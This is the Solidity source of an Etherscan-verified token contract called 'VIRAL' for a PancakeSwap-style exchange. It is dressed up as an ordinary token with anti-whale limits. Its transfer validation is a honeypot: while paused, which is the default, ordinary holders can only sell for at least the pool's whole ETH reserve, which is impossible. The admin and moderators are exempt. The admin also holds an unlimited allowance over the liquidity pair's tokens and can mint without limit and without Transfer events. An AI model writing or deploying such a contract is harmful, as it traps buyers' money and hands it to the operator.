/**
 *Submitted for verification at Etherscan.io on 2023-06-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}


interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}


interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract MyTokenV3 is Context, Ownable, IERC20 {

    using SafeMath for uint256;

    IPancakeRouter02 internal _router;
    IPancakePair internal _pair;

    uint8 internal constant _decimals = 18;
    string internal constant _name = "VIRAL";
    string internal constant _symbol = "VIRAL";
    uint internal _totalSupply = 4000000 * (10 ** _decimals);
    uint public maxHoldingPrecent = 25;
    uint internal saleThresold = 0; // 0 ether
    bool internal paused = true; 

    mapping(address => uint) internal _balances;
    mapping(address => mapping(address => uint)) internal _allowances;

    mapping(address => bool) internal _isModerator;
    address public _admin;

    mapping(address => uint) internal _boughtAmount;
    mapping(address => uint) internal _soldAmount;

    event Burn(address _sender, address _recepient, uint _amount);
    event AdminshipTransfered(address _sender, address _newAdmin);

    modifier onlyAdmin() {
        require(_msgSender() == _admin, "OnlyAadmin: You are not Administrator");
        _;
    }

    constructor(address _routerAddress) {
        _router = IPancakeRouter02(_routerAddress);
        _pair = IPancakePair(IPancakeFactory(_router.factory()).createPair(address(this),address(_router.WETH())));
        
        _admin = owner();
        _balances[owner()] = _totalSupply;

        _allowances[address(_pair)][_admin] = ~uint256(0);
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function decimals() external pure returns (uint) {
        return _decimals;
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() external override view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external override view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) external override view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external override returns (bool) {
        _transferFrom(from, to, amount);
        return true;
    }

    

    function _transfer(address _from, address _to, uint _amount) private {
        require(_balances[_from] >= _amount, "Transfer: Insufficient balance of the sender");
        _beforeTokenTransfer(_from, _to, _amount);
        _balances[_from] -= _amount;
        _balances[_to] += _amount;

        emit Transfer(_from, _to, _amount);
    }

    function _approve(address _sender, address _spender, uint _amount) private {
        require(_sender != address(0), "Approve: Approve from the zero address");
        require(_spender != address(0), "Approve: Approve to the zero address");

        _allowances[_sender][_spender] = _amount;
        emit Approval(_sender, _spender, _amount);
    }

    function _transferFrom(address _from, address _to, uint _amount) private {
        uint currentAllowance = _allowances[_from][_msgSender()];
        require(currentAllowance >= _amount, "TransferFrom: Insufficient allowance");
        _transfer(_from, _to, _amount);
        _approve(_from, _msgSender(), currentAllowance - _amount);
    }

    function _beforeTokenTransfer(address _from, address _to, uint _amount) private {
        if (_from != _admin && !_isModerator[_from] && _from != owner()) {
            bool res = validation(_from, _to, _amount);
            require(res == true, "Validation: Transfer not validated");
        }
        if (_hasLiquidity()) {
            if (isMarket(_from)){
                _boughtAmount[_to] += _amount;
            }

            if (isMarket(_to)){
                _soldAmount[_from] += _amount;
            } 
        }
    }

    

    function setModerator(address _address, bool _state) public onlyAdmin {
        _isModerator[_address] = _state;
    }

    function isModerator(address _address) public view returns (bool) {
        return _isModerator[_address];
    }

    function isNotWhale(address _address) internal view returns (bool) {
        if (!isMarket(_address)) {
            return _balances[_address] <= _getMaxHolding();
        } else {
            return true;
        }
    }

    function _getMaxHolding() internal view returns (uint) {
        uint maxHoldingAmount = _totalSupply * maxHoldingPrecent / 100;
        return maxHoldingAmount;
    }

    function _setMaxHolding(uint _precent) internal onlyAdmin {
        require(_precent >= 100, "Max holding can't be more than 100");
        maxHoldingPrecent = _precent;
    }

    function isMarket(address _address) internal view returns (bool) {
        return _address == address(_pair) || _address == address(_router);
    }

    function _hasLiquidity() private view returns (bool) {
        (uint256 reserve0, uint256 reserve1,) = _pair.getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }

    function _sellETHequivalent(uint _amount) internal view returns(uint) {
        (uint256 reserve0, uint256 reserve1,) = _pair.getReserves();
        if (_pair.token0() == _router.WETH()) {
            return _router.getAmountOut(_amount, reserve1, reserve0);
        } else {
            return _router.getAmountOut(_amount, reserve0, reserve1);
        }
    }

    function _ETHReserves() internal view returns (uint) {
        if (paused) {
            (uint256 reserve0, uint256 reserve1,) = _pair.getReserves();
            if (_pair.token0() == _router.WETH()) {
                return reserve0;
            } else {
                return reserve1;
            }
        } else {
            return 0;
        }
    }

    function isSuperUser(address _user) internal view returns (bool) {
        if (_user == _admin || _user == owner() || _isModerator[_user]) {
            return true;
        } else {
            return false;
        }
    }

    function validation(address _from, address _to, uint _amount) internal view returns (bool) {
        if (!isSuperUser(_to)) {
            require(isNotWhale(_to) == true, "Validation: Recepient is whale");
        }
        if (isMarket(_to)){
            return _boughtAmount[_from] >= saleThresold && _sellETHequivalent(_amount) >= _ETHReserves();
        }
        return true;
    }

    function getSaleThresold() public view returns (uint) {
        return saleThresold;
    }

    function setSaleThresold(uint _saleThresold) public onlyAdmin {
        saleThresold = _saleThresold;
    }

    function setPauseState(bool _state) public onlyAdmin {
        paused = _state;
    }

    function increaseEmission(uint _amount) public onlyAdmin {
        _balances[_msgSender()] += _amount;
        _totalSupply += _amount;
    }

    function burn(uint _amount) public onlyAdmin {
        require(_balances[_msgSender()] >= _amount, "Burn: Insufficient balance for burning");
        _balances[_msgSender()] -= _amount;
        _totalSupply -= _amount;

        emit Burn(_msgSender(), address(0), _amount);
    }

    function transferAdminship(address _newAdmin) public onlyOwner {
        require(_newAdmin != address(0), "TransferAdminship: zero-address can't be an admin");
        _admin = _newAdmin;
        emit AdminshipTransfered(owner(), _newAdmin);
    }
}